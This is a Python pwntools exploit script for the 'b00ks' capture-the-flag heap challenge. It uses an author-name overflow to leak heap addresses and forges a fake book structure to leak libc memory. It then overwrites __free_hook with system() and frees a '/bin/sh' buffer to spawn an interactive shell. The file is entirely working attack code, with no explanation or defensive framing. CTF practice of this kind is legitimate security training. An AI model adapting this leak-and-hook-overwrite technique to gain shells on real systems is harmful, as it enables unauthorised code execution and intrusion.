from pwn import *
 
context.log_level = 'info'#'debug'
p = process("./b00ks")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p)

def CreateBook(namesize,name,dspsize,dsp):
    p.readuntil('>')
    p.sendline('1')
    p.readuntil(':')
    p.sendline(str(namesize))
    p.readuntil(':')
    p.sendline(name)
    p.readuntil(':')
    p.sendline(str(dspsize))
    p.readuntil(':')
    p.sendline(dsp)

def DelBook(id):
    p.readuntil('>')
    p.sendline('2')
    p.readuntil(':')
    p.sendline(str(id))
    
def EditBook(id,dsp):
    p.readuntil('>')
    p.sendline('3')
    p.readuntil(':')
    p.sendline(str(id))
    p.readuntil(':')
    p.sendline(dsp)

def PrintBooks(id):
    p.readuntil('>')
    p.sendline('4')
    for i in range(id):
        p.readuntil(':')
        book_id = int(p.readline())
        p.readuntil(':')
        book_name = p.readline()
        p.readuntil(':')
        book_dsp = p.readline()
        p.readuntil(':')
        author = p.readline()
    return book_id,book_name,book_dsp,author
    
def ChangeAuthor(name):
    p.readuntil('>')
    p.sendline('5')
    p.readuntil(':')
    p.sendline(name)


def hack():
    #stage1:leak heap addr
    p.readuntil(':')
    p.sendline('a'*32) #send author name
    CreateBook(128,'a',128,'b')
    CreateBook(0x21000,'asdf',0x21000,'erty')
    book_id_1,book_name,book_dsp,author =PrintBooks(1)
    msg = author.split('a'*32)[1].strip('\n')
    addr = u64(msg.ljust(8,'\x00'))
    log.success("heap addr of book_1:"+hex(addr))
    #stage2:make fake book_struct data
    fake_data = p64(0x1)+p64(addr+0x38)+p64(addr+0x38)+p64(128)
    EditBook(1,fake_data)
    ChangeAuthor('c'*32)
    book_id_1,book_name,book_dsp,author =PrintBooks(1)
    addr = u64(book_dsp[1:].strip('\n').ljust(8,'\x00'))
    print "mmap addr:%x" %addr
    libc_base = addr+0x21ff0
    print "libc base:%x" %libc_base
    #stage3:get shell
    free_hook = libc.symbols['__free_hook']+libc_base
    system = libc.symbols['system']+libc_base
    binsh = libc.search('/bin/sh').next()+libc_base
    print "free_hook:%x----binsh:%x--system:%x" %(free_hook,binsh,system)
    EditBook(1,p64(binsh)+p64(free_hook))
    EditBook(2,p64(system))
    DelBook(2)
    p.interactive()




def test():
    p.readuntil(':')
    p.sendline("authorname")
    CreateBook(100,"firstbook",100,"good")
    CreateBook(100,"secondbook",100,"verygood")
    p.interactive()
    



if __name__ == '__main__':
    #test()
    hack()
